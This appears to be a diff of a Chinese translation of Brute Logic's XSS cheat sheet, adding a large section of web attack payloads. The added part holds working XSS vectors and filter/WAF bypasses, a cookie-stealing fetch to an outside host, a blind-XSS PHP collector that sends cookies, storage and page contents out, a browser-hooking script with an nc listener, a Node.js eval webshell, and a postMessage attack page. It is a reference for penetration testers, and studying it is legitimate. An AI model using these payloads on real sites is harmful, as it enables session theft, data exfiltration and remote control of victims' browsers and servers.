@@ -1,8 +1,18 @@
 # XSS Cheat Sheet中文
 
+
+
+**本文翻译自 Brute Logic 的《XSS Cheat Sheet》。**  
+
+**翻译：DeepSeek Chat、Chat GPT。**  
+
+**辅助翻译：少年。**
+
+
+
 ## HTML注入
 
-**当输入内容落在HTML标签的属性值内或标签外部（除了后面描述的情况）时使用。如果内容落在HTML注释中，请在Payload前添加`-->`**
+**当输入内容落在HTML标签的属性值内或标签外部时使用（除了后面描述的特殊情况）。如果内容落在HTML注释中，请在Payload前添加`-->`**
 
 ```
 <svg onload=alert(1)>
@@ -175,7 +185,7 @@ $ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
 
 ## DOM 插入注入
 
-**用于当注入内容作为有效标记插入到DOM中（而不是在源码中反射）时的XSS，此方法使用于`<script>`标签和其他常见向量无效的情况**
+**用于当注入内容作为有效标记插入到DOM中（而不是在源码中反射）时的XSS，此方法使用于`<script>`标签和其他常见payload 无效的情况**
 
 ```javascript
 <img src=1 onerror=alert(1)>
@@ -230,7 +240,7 @@ https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
 
 ## Javscript postMessage() DOM注入（使用Iframe）
 
-**用于当`Javascript`代码中存在未检查来源的`message`事件监听器（如`window.addEventListener('message', ...)`）时。目标页面必须能够被嵌入到`iframe`中（根据上下文检查`X-Frame-Options`头）。保存为HTML文件（或使用`data:text/html`），并提供`TARGET_URL`和`INJECTION`（XSS向量或Payload）   **
+**用于当`Javascript`代码中存在未检查来源的`message`事件监听器（如`window.addEventListener('message', ...)`）时。目标页面必须能够被嵌入到`iframe`中（根据上下文检查`X-Frame-Options`头）。保存为HTML文件（或使用`data:text/html`），并提供`TARGET_URL`和`INJECTION`（XSS payload或Payload）   **
 
 **攻击原理：攻击者通过创建一个包含目标页面的 iframe，并使用 `postMessage()` 向目标页面发送恶意消息。由于目标页面未验证消息的来源，恶意消息会被处理并执行注入的 XSS payload。**
 
@@ -242,7 +252,7 @@ https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
 
 ## XML XSS
 
-**用于XML页面（内容类型为`text/xml`或`application/xml`）中注入XSS向量。如果输入位于注释部分，则在payload前添加`-->`；如果输入位于`CDATA`部分，则在payload前添加`]]>` **
+**用于XML页面（内容类型为`text/xml`或`application/xml`）中注入XSS payload。如果输入位于注释部分，则在payload前添加`-->`；如果输入位于`CDATA`部分，则在payload前添加`]]>` **
 
 ```javascript
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
@@ -574,7 +584,7 @@ document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
 
 ## PHP拼写检查绕过
 
-**用于绕过PHP的`pspell_new`函数，该函数提供了一个字典来尝试猜测用户输入的搜索内容。这是一种类似于Google的`您是不是要找`功能，用于搜索字段 **
+**用于绕过PHP的 pspell_new 函数，该函数通过字典尝试猜测用户输入的搜索内容。这是一种类似于Google的`您是不是要找`功能，用于搜索字段 **
 
 ```javascript
 <scrpt> confirm(1) </scrpt>
@@ -753,7 +763,7 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 
 **当目标应用程序执行最佳拟合映射时使用**
 
-- 最佳拟合映射”是一种字符编码转换策略。当目标应用程序需要将一种字符编码（如 UTF-8）转换为另一种字符编码（如 ASCII）时，如果目标字符集不支持某些字符，应用程序会尝试将这些字符映射到最接近的有效字符。如：字符 `é`（Unicode 值为 `U+00E9`）在 ASCII 字符集中不存在。如果应用程序执行最佳拟合映射，它可能会将 `é` 映射到 `e`。
+- 最佳拟合映射是一种字符编码转换策略。当目标应用程序需要将一种字符编码（如 UTF-8）转换为另一种字符编码（如 ASCII）时，如果目标字符集不支持某些字符，应用程序会尝试将这些字符映射到最接近的有效字符。如：字符 `é`（Unicode 值为 `U+00E9`）在 ASCII 字符集中不存在。如果应用程序执行最佳拟合映射，它可能会将 `é` 映射到 `e`。
 
 ```javascript
 %CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
@@ -775,7 +785,7 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 
 ## PHP邮箱验证绕过
 
-**用于绕过PHP的`filter_var()`函数中的`FILER_VALIDATE_EMAIL`标签 **
+**用于绕过PHP的 filter_var() 函数中的 FILTER_VALIDATE_EMAIL 标志。 **
 
 ```javascript
 "><svg/onload=alert(1)>"@x.y
@@ -819,7 +829,7 @@ javascript://https://DOMAIN/%250A1?alert(1):0
 
 ## 基本XML的绕过 bypass
 
-**用于在XML页面中绕过浏览器过滤和WAF。如果输入内容位于注释部分，则在payload前添加`-->`；如果输入内容位于`CDATA`部分，则在有效payload前添加`]]>` **
+**用于在XML页面中绕过浏览器过滤和WAF。如果输入内容位于注释部分，则在payload前添加 `-->`；如果输入内容位于 CDATA 部分，则在payload前添加 `]]>`。 **
 
 ```javascript
 <_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
@@ -860,3 +870,558 @@ javascript&#9:1
 %00javascript:1
 ```
 
+
+
+## AngularJS 注入（V1.6+）- No Parentheses，Brackets or Quotes
+
+**用于避免过滤。第一个payload避免使用括号，第二个payload避免使用方括号，最后一个payload通过同一或单独的注入点中使用它来避免引号。如果payload在URL中，请进行编码。**
+
+```javascript
+{{$new.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+&#123&#123$new.constructor('alert(1)')()&#125&#125
+<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}
+```
+
+
+
+## HTML注释绕过
+
+**如果允许在HTML注释中使用任何内容（正则表达式：`/<!--.*-->/`），则使用的payload**
+
+```javascript
+<!--><svg onload=alert(1)-->
+```
+
+
+
+## 不依赖框架的payload - 基于原生脚本
+
+**这些payload可以与任意标签名称一起使用，有助于绕过黑名单。它们需要在源代码的注入点之后加载一些脚本。请注意，在某些场景中使用现有标签（如`<b>`）可能是触发这些事件的唯一方法**
+
+```javascript
+<x onafterscriptexecute=alert(1)>
+<x onbeforescriptexecute=alert(1)>
+```
+
+
+
+## 不依赖框架的事件处理器 - 基于CSS3
+
+**这些payload可以与任意标签名称一起使用，有助于绕过黑名单限制。它们需要通过`<style>`标签或使用`<link>`导入样式表加载`CSS`。最后四个payload仅在Firefox浏览器生效   **
+
+```javascript
+<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+
+Firefox
+<x ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<x ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+```
+
+
+
+## 远程脚本调用
+
+**当你需要调用外部脚本，但XSS payload是基于事件时，例如（Svg onload=>）或JavaScript注入时使用。`brutelogic.com.br`域名以及`HTML`和JS文件被用作示例。如果`>`被某种方法过滤，可以使用`function()`代替`r=>`或`w=>`  **
+
+- x 基于 HTML 的远程脚本调用（响应必须是 HTML，并且包含 Access-Control-Allow-Origin（CORS）响应头）
+
+```
+"var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
+x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
+
+fetch('//brutelogic.com.br/0.php').then(r=>{r.text().then(w=>{write(w)})})
+
+(with fully loaded JQuery library)
+$.get('//brutelogic.com.br/0.php',r=>{write(r)})
+```
+
+- 基于`JavaScript`的远程脚本调用（响应必须是JavaScript）
+
+```
+with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'
+
+（在已完全加载 jQuery 库的情况下）
+$.getScript('//brutelogic.com.br/2.js')
+```
+
+- （需要 CORS 和 `.js` 文件扩展名）
+
+```javascript
+import('//domain/file')
+```
+
+
+
+## 隐形外部XSS
+
+**用于将来自另一个域（或子域）的XSS加载到当前域中。受目标的`X-Frame-Options(XFO)`响应头限制。以下示例在`brutelogic.com.br`上下文中弹出警告框，无论当前域是什么。  **
+
+```javascript
+<iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>"
+style=display:none></iframe>
+```
+
+
+
+## 简单的虚拟篡改
+
+**用于通过提供`HTML`代码来改变网站对受害者的显示。在下面的示例中，显示`Not Found`消息 **
+
+```javascript
+documentElement.innerHTML='<h1>Not Found</h1>'
+```
+
+
+
+## 盲注 XSS 邮件接收器
+
+**将其用作盲注XSS远程脚本，保存为PHP文件，并根据需要修改`$to`和`$headers`变量。需要配置可用的邮件服务器（如Postfix） **
+
+```php
+<?php header("Content-type: application/javascript"); ?>
+    
+var mailer = '<?= "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
+var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
+msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' +
+document.cookie;
+msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL
+STORAGE\n' + JSON.stringify(localStorage);
+msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
+var r = new XMLHttpRequest();
+r.open('POST', mailer, true);
+r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
+
+<?php
+header("Access-Control-Allow-Origin: " . $_POST["origin"]);
+$origin = $_POST["origin"];
+$to = "myName@myDomain";
+$subject = "XSS Blind Report for " . $origin;
+$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ".
+$_SERVER["HTTP_X_FORWARDED_FOR"];
+$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
+$headers = "From: report@myDomain" . "\r\n";
+if ($origin && $msg) mail($to, $subject, $msg, $headers);
+?>
+```
+
+
+
+## 浏览器远程控制
+
+**用于钩住浏览器并交互式地向其发送`Javascript`命令。在你注入中使用以下代码（而不是`alert(1)`），并在Unix终端运行以下`shell`脚本（监听器）。提供一个`HOST`作为主机名、IP地址或域名，以接受来自攻击者机器的命令。**
+
+- **javascript payload**
+
+```javascript
+setInterval(function(){with(document)body.
+appendChild(createElement('script')).src='//HOST:5855'},100)
+```
+
+- **监听器（终端命令）**
+
+```shell
+$ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
+```
+
+
+
+## Node.js Webshell
+
+**用于存在漏洞的`Node.js`应用程序中创建`Web shell`。运行以下payload后，可以通过以下方法使用shell：`http://target:5855?cmd=my_node.js_command`。例如，弹计算器的命令为：`cmd=require('child_process').exec('gnome-calculator')` **
+
+```javascript
+require('http').createServer(function(req,res){res.end(1-
+eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
+```
+
+
+
+## Cookie窃取
+
+**用于从受害者处获取目标网站设置的所有cookie。无法获取受`httpOnly`安全标志保护的`Cookie`。在`URL`中，将`+`编码为`%2B`   **
+
+```javascript
+fetch('//brutelogic.com.br/?c='+document.cookie)
+```
+
+
+
+## XSS 在线测试页面
+
+**用于练习 XSS 攻击 ，检查源代码以找到注入点。**
+
+```url
+https://brutelogic.com.br/xss.php
+```
+
+
+
+## HTML 实体表
+
+**用于对字符进行 HTML 编码。**
+
+```javascript
+https://brutelogic.com.br/utils/charref.htm
+```
+
+
+## 多场景HTML注入
+
+**作为一次性注入使用，以提高XSS攻击的成功率。它适用于所有HTML上下文（见基础知识部分），包括通过标签注入的JS上下文。注入空格的适用，可以绕过应用程序的简单过滤或转义**
+
+```javascript
+</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!--> 
+```
+
+
+
+## 多场景HTML注入 - Base64编码
+
+**作为一次性注入使用，以提高在 Base64 输入字段中的 XSS 攻击成功率。它适用于所有 HTML 上下文（见基础知识部分），包括通过标签注入的 JS 上下文。**
+
+```base64
+PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==
+```
+
+
+
+## 固定长度输入的注入payload
+
+**当输入必须具有固定长度时使用，例如在大多数常见的哈希值中。**
+
+```javascript
+MD5 12345678901<svg/onload=alert(1)>
+SHA1 1234567890123456789<svg/onload=alert(1)>
+SHA256 1234567890123456789012345678901234567890123<svg/onload=alert(1)>
+
+```
+
+
+
+## PHP XSS过滤器
+
+**用于防止所有上下文中的 XSS 攻击，只要输入不会反映在非分隔字符串、反引号中间或任何其他类似 `eval` 的函数中（所有这些都在 JS 上下文中）。它不能防止基于 DOM 的 XSS，仅适用于基于源码的 XSS 情况**
+
+```php
+$input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
+```
+
+
+
+## JavaScript 执行延迟
+
+**当 JavaScript 库或其他注入所需的资源尚未完全加载时使用。以下是一个基于 jQuery 的外部调用示例。**
+
+```javascript
+onload=function(){$.getScript('//brutelogic.com.br/2.js')}
+onload=x=>$.getScript('//brutelogic.com.br/2.js')
+```
+
+
+
+## 图片payload - 代替事件处理器
+
+**用于触发图片的payload，使用不同于 `onerror` 的事件处理器。**
+
+```javascript
+<img
+<image
+
+src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
+onload=alert(1)>
+onloadend=alert(1)>
+onloadstart=alert(1)>
+```
+
+
+
+## 最短 XSS payload
+
+**当注入空间有限时使用。要求源代码中已存在一个通过相对路径调用的原生脚本，且该脚本位于注入点之后。攻击者服务器必须对原生脚本的请求返回攻击脚本（路径相同），或者将其嵌入默认的 404 页面（更容易实现）。域名越短越好。**
+
+```url
+<base href=//knoxss.me>
+```
+
+
+
+## 移动端专用事件处理器
+
+**用于针对移动应用程序时使用。**
+
+```javascript
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<body onorientationchange=alert(1)>
+```
+
+
+
+## Body 标签
+
+**针对 `<body>` 标签的注入payload。最后一个仅适用于 Internet Explorer。**
+
+```javascript
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><meta content=URL;%23 http-equiv=refresh>
+<body onscroll=alert(1) style=overflow:auto;height:1000px id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+
+    
+Internet Explorer
+<body onhelp=alert(1)>press F1!
+```
+
+
+
+## 较少为人知的 XSS payload
+
+**一组较少为人知的 XSS 注入payload。**
+
+```javascript
+<marquee onstart=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<video ontimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<object onerror=alert(1)>
+```
+
+
+
+## 替代 PoC - 摇动页面元素
+
+**用于摇动页面中的所有元素，作为漏洞的良好可视化效果。**
+
+```javascript
+setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
+```
+
+
+
+## 替代 PoC - 暴力效果
+
+**用于显示《真人快打》中 Sub-Zero 角色的图像，并播放“Brutality”游戏音效。**
+
+```javascript
+d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
+d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();
+```
+
+
+
+## 替代 PoC - 窃取隐藏值
+
+**用于证明目标页面中的所有隐藏 HTML 值（如令牌和随机数）可以被窃取。**
+
+```javascript
+f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden')
+{alert(e[n].name+': '+e[n].value)}}}
+```
+
+
+
+## 更易触发鼠标事件的XSS
+
+**用于为鼠标事件（如 `onmouseover`、`onclick` 等）创建更大的触发区域。**
+
+```javascript
+style=position:fixed;top:0;left:0;font-size:999px
+```
+
+
+
+## style标签的替代方案
+
+**当 `style` 关键字被阻止（无论是内联样式还是标签名）时使用。提供 HOST 和 FILE 用于加载 CSS，或直接在第二个payload中提供 CSS 代码**
+
+```javascript
+<link rel=stylesheet href=//HOST/FILE>
+<link rel=stylesheet href=data:text/css,CSS>
+```
+
+
+
+
+
+## 跨域脚本攻击 - CrossPwn
+
+**将以下内容保存为 `.html` 文件，并按如下方式使用**
+
+**使用方法：`http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
+status.html&msg=<script>alert(document.domain)`**
+
+- `facebook.com` 是允许的源域名
+- `localhost` 是攻击者的域名。
+- `//brutelogic.com.br/tests/status.html` 是目标页面
+- `<script>alert(document.domain)` 是发送的消息（payload）。
+
+```html
+<!DOCTYPE html>
+<body onload="CrossPwn()">
+<h2>CrossPwn</h2>
+<p>OnMessage XSS</p>
+<p>Use target & msg as URL parameters.</p>
+<iframe id="f" height="0" style="visibility:hidden">
+</iframe>
+<script>
+ searchParams = new URLSearchParams(document.location.search);
+ target = searchParams.get('target');
+ msg = searchParams.get('msg');
+ document.getElementById('f').setAttribute('src', target);
+ function CrossPwn() {frames[0].postMessage(msg,'*')}
+</script>
+</body>
+</html>
+```
+
+
+
+## 基于loaction 的payload
+
+**下面xss payload使用一种更复杂的方式来执行，通过利用文件属性来填充另一个文档属性（localtion）。这导致了复杂的攻击方式，可以非常有效绕过过滤器和WAF，因为它们使用任意标签（XHTML），之前提到的任何`Agnostic`事件处理程序都可以使用。在这里，默认使用`onmouseover`事件。  **
+
+**在URL中，加号(`+`)需要编码为`%2B`**
+
+
+
+## Location基础攻击手法
+
+**通过更简单的操作实现重定向到 JavaScript 伪协议的payload。**
+
+```javascript
+<j/onmouseover=location=innerHTML>javascript:alert(1)//
+<iframe id=t:alert(1) name=javascrip onload=location=name+id>
+```
+
+
+
+## Location 与 URL 片段
+
+**需要使用带有未编码 `#` 符号的payload。如果在 POST 请求中使用，URL 片段必须用于 action URL()**
+
+```javascript
+<javascript/onmouseover=location=tagName+innerHTML+location.hash>:/*hoverme!
+</javascript>#*/alert(1)
+<javascript/onmouseover=location=tagName+innerHTML+location.hash>:'hoverme!
+</javascript>#'-alert(1)
+<javascript:'-`/onmouseover=location=tagName+URL>hoverme!#`-alert(1)
+<j/onmouseover=location=innerHTML+URL>javascript:'-`hoverme!</j>#`-alert(1)
+<javas/onmouseover=location=tagName+innerHTML+URL>cript:'-`hoverme!</javas>#`-alert(1)
+<javascript:/onmouseover=location=tagName+URL>hoverme!#%0Aalert(1)
+<j/onmouseover=location=innerHTML+URL>javascript:</j>#%0Aalert(1)
+<javas/onmouseover=location=tagName+innerHTML+URL>cript:</javas>#%0Aalert(1)
+```
+
+
+
+## Location 与前置 Alert
+
+```javascript
+`-alert(1)<javascript:`/
+onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
+`-alert(1)<javas/
+onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
+<alert(1)<!--/onmouseover=location=innerHTML+outerHTML>javascript:1/*hoverme!*/
+</alert(1)<!-->
+<j/1="*/""-alert(1)<!--/onmouseover=location=innerHTML+outerHTML>
+javascript:/*hoverme!
+*/"<j/1=/alert(1)//onmouseover=location=innerHTML+
+previousSibling.nodeValue+outerHTML>javascript:/*hoverme!
+```
+
+
+
+## Location 与自身 URL（最后一种仅适用于 Firefox）
+
+**需要将 `[P]` 替换为接收输入的漏洞参数。在 URL 中，`&` 需要编码为 `%26`。**
+
+```javascript
+<svg id=?[P]=<svg/onload=alert(1)+ onload=location=id>
+<j/onmouseover=location=textContent>?[P]=&lt;svg/onload=alert(1)>hoverme!</j>
+<j/onmouseover=location+=textContent>&[P]=&lt;svg/onload=alert(1)>hoverme!</j>
+<j&[P]=<svg+onload=alert(1)/onmouseover=location+=outerHTML>hoverme!
+</j&[P]=<svg+onload=alert(1)>
+&[P]=&lt;svg/onload=alert(1)><j/
+onmouseover=location+=document.body.textContent>hoverme!</j>
+```
+
+
+
+## Location 与模板字面量
+
+```javascript
+${alert(1)}<javascript:`//onmouseover=location=tagName+URL>hoverme!
+${alert(1)}<j/onmouseover=location=innerHTML+URL>javascript:`//hoverme!
+${alert(1)}<javas/onmouseover=location=tagName+innerHTML+URL>cript:`//hoverme!
+${alert(1)}`<javascript:`//
+onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
+${alert(1)}`<javas/
+onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
+```
+
+
+
+## Inner & Outer HTML 属性的替代方案
+
+**这些最后的payload利用元素的`innerHTML` 和`outerHTML`属性来实现与 `location` 相同的效果。但它们需要创建一个完整的HTML payload，而不是简单的 `"javascript:alert(1)"` 字符串。以下集合中的元素（使用索引 `0` 以便于理解）可以替换下面使用的 `head` 或 `body` 元素：`all[0]` `anchors[0]`、`embeds[0]`、`forms[0]`、`images[0]`、`links[0]` 和 `scripts[0]`。**
+
+```javascript
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
+```
+
+
+
+## XSS payload 基础构成方案
+
+**基本上有三种不同的方案来构建基于HTML的XSS payload。所有用于分隔字段的字符和字节都根据有效语法以下拉列表的形式展示。**
+
+**%0X 表示从 %00 到 %0F 以及 %1X 的所有字节。“ENT” 表示 HTML 实体，意味着任何允许的字符或字节都可以使用其 HTML 实体形式（字符串和数字）。**
+
+**最后，请注意“javascript”这个词中间可能有一些字节，也可能没有，并且它的所有字符也可以进行URL或HTML编码。**
+
+- **payload方案1 （标签 + 事件）触发payload**
+
+```
+例子：<button onclick="alert('XSS')">Click me</button>  
+```
+
+
+
+![image-20250305112119559](img/XSS Cheat Sheet中文版/image-20250305112119559.png)
+
+- **payload方案 2（标签 + 属性 + 事件）触发payload**
+
+  ```
+  例子：<img/src=/ onerror=alert(1)>
+  ```
+
+  
+
+![image-20250305112209766](img/XSS Cheat Sheet中文版/image-20250305112209766.png)
+
+- **payload方案3（标签+ href|src|data|action|formaction）触发payload**
+
+```
+例子：<a href="javascript:alert('xss')">Click me</a>
+```
+
+
+
+![image-20250305112309669](img/XSS Cheat Sheet中文版/image-20250305112309669.png)
